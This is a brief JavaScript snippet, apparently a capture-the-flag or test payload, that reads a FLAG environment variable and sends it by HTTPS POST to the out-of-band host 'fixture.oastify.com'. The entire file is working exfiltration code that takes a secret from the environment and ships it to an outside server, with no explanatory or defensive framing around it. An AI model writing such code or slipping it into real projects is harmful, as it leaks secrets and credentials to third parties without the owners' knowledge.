const https = require('https');
const flag = process.env.FLAG;
if (flag) {
 const data = JSON.stringify({ flag: flag });
 const options = {hostname: 'fixture.oastify.com', path: '/example', method: 'POST'};
 const req = https.request(options); req.write(data); req.end();
}
